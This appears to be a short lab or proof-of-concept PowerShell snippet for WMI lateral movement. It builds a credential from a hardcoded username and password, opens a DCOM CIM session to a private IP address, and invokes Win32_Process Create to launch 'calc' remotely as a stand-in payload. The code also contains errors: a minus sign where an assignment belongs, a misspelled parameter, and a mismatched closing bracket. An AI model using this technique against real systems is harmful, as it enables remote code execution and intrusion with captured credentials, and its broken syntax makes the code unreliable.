# Creating a PSCredential Object in powershell
$username = 'stradestack';
$password = 'stradestack';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Creating a new CimSession with 'calc' as payload
$options = New-CimSessionOption -Protocol DCOM
$session - New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SesssionOption $Options
$command = 'calc';

# Invoking the WMI session through powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command];
